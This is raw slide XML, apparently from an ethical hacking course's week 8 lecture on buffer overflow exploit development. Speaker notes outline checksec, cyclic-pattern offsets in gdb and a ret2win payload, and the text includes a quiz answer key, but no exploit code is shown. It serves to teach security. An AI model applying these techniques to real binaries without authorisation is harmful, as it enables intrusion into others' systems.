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usually the most intimidating-sounding week on the syllabus — address that directly and immediately. Reassure the class this follows the exact same "understand the mechanism, then use a tool" pattern as passwords and SQL injection; it just operates one level lower, at memory instead of at an application or database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week in Phase 3 — say so explicitly, and remind the class this closes out the "gaining access" toolkit: passwords, web flaws, and now memory corruption. Next week the highlighted box finally moves again into Phase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has more moving parts than any previous one — say that plainly and give the class permission to move slowly through the lab. Objective six is worth flagging as the one that ties the whole session together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stack layout on the whiteboard: buffer at the bottom, saved RBP above it, return address above that. This single diagram is the foundation for literally everything else this week — do not skip drawing it even though it is also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checksec as "recon, but for a single binary" — it is the exact same instinct as Week 3's nmap scan, just aimed at a program's memory protections instead of a network's open ports. That parallel helps the week feel less like an entirely new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connecting each line back to a specific step of the attack still to come: no canary means the overwrite goes undetected, no PIE means the address we find today will still be correct when we run the exploit later. This slide is the bridge between theory and the rest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mapping (canary → detection, NX → execution, PIE → addressing) is genuinely one of the more testable exam facts in this course — consider having students write the three pairs down verbatim rather than just reading past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"systematic instead of guessing" pitch — contrast it explicitly with sending "AAAA...AAAA" and eyeballing how many A's caused a crash, which is unreliable and does not scale. The cyclic pattern technique is the professional version of that same instinct.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$rip-vs-$rsp distinction in the second note is a genuinely subtle, real gotcha — worth explaining carefully since it trips up even experienced people the first time they hit it. Non-canonical addresses fault at the jump instruction itself, not at the (nonsensical) destination, so $rip alone can be misleading.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NX point in bullet four is worth emphasizing precisely because it surprises people — many assume every buffer overflow needs NX disabled, when ret2win specifically sidesteps that requirement entirely by reusing existing code rather than injecting new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 everything since the title slide has been building toward this exact payload. If you only have time to walk through one exploit line by line this week, make it this one: 72 bytes of padding, then the address, nothing more complicated than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worth leaving on screen a beat longer than usual — it directly answers the question every student is quietly asking by this point in the lecture: "wait, would this actually work against a real, modern binary?" The honest answer is in the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 one is worth a direct callback to the gdb terminal slide — this is genuinely one of the most common real mistakes people make the first several times they do this, not a hypothetical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reference pacing before the lab handoff — this is a dense slide, so give it a few extra seconds compared to other weeks' cheat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expectations honestly before releasing the room: getting a fully interactive shell afterward is not guaranteed with this basic technique over a plain socket, since there is no real terminal attached — but the flag printed by win() is the actual graded proof of code execution regardless, so a dropped shell afterward is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answers: Q1-B, Q2-B, Q3-B, Q4-B. Q4 is the one most likely to be missed — it directly tests the NX misconception flagged earlier in the ret2win concept slide, so treat a wrong answer here as a signal to revisit that slide rather than moving straight to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 milestone worth marking clearly — three full weeks and three fundamentally different techniques for gaining access are now complete. Next week is the first time the highlighted roadmap box moves since Week 6, into Phase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595360" y="0"/>
            <a:ext cx="3596335" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="preencoded.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1">
            <a:alphaModFix amt="85000"/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9189720" y="2606040"/>
            <a:ext cx="2011680" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="960120"/>
            <a:ext cx="73152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PHASE 3 — GAINING ACCESS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1371600"/>
            <a:ext cx="7589520" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exploit Development</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>(Buffer Overflow)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3520440"/>
            <a:ext cx="7315200" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Not every way in is a known password or a web flaw — sometimes you write your own exploit.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4572000"/>
            <a:ext cx="2286000" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16129"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="22D3EE"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4572000"/>
            <a:ext cx="2286000" cy="56692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WEEK 8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="4572000"/>
            <a:ext cx="3200400" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16129"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="8000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="94A3B8"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="4572000"/>
            <a:ext cx="3200400" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0"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Phase 3 of 5: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="635508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Ethical Hacking Course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COURSE ROADMAP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="841248"/>
            <a:ext cx="10058400" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Where This Week Fits</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1623060" y="3337560"/>
            <a:ext cx="8915400" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="1B2740"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2377440"/>
            <a:ext cx="1965960" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="64748B"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="77724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1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="77724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Reconnaissance</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2868930" y="2377440"/>
            <a:ext cx="1965960" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="64748B"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="300609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2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="300609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Scanning &amp;</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Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5097780" y="2377440"/>
            <a:ext cx="1965960" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="22D3EE"/>
          </a:solidFill>
          <a:ln/>
          <a:effectLst>
            <a:outerShdw sx="100000" sy="100000" kx="0" ky="0" algn="bl" rotWithShape="0" blurRad="127000" dist="50800" dir="5400000">
              <a:srgbClr val="22D3EE">
                <a:alpha val="35000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5234940" y="2560320"/>
            <a:ext cx="1691640" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PHASE 3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="523494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0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Gaining</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5234940" y="4434840"/>
            <a:ext cx="1691640" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 85714"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="10000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5234940" y="4434840"/>
            <a:ext cx="1691640" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="22D3EE"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>YOU ARE HERE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7326630" y="2377440"/>
            <a:ext cx="1965960" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="64748B"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="746379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4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="746379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Maintaining</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Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9555480" y="2377440"/>
            <a:ext cx="1965960" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="64748B"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="969264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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="969264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Covering</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Tracks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="140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8 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>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LEARNING OBJECTIVES</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="841248"/>
            <a:ext cx="10058400" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>By the End of This Week, You Will Be Able To</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1828800"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>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234440" y="178308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Read C source for an unbounded write</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="211226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Spot a fixed-size buffer receiving more data than it can hold, with no bounds check.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2697480"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>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234440" y="265176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Check a binary's protections with checksec</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="298094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Read stack canary, NX, and PIE status, and explain what each one defends against.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3566160"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>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03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="352044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Determine an exact stack offset</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="384962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Use a cyclic pattern in gdb to reliably find where a return address sits, rather than guessing.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6126480" y="1828800"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="61264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04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
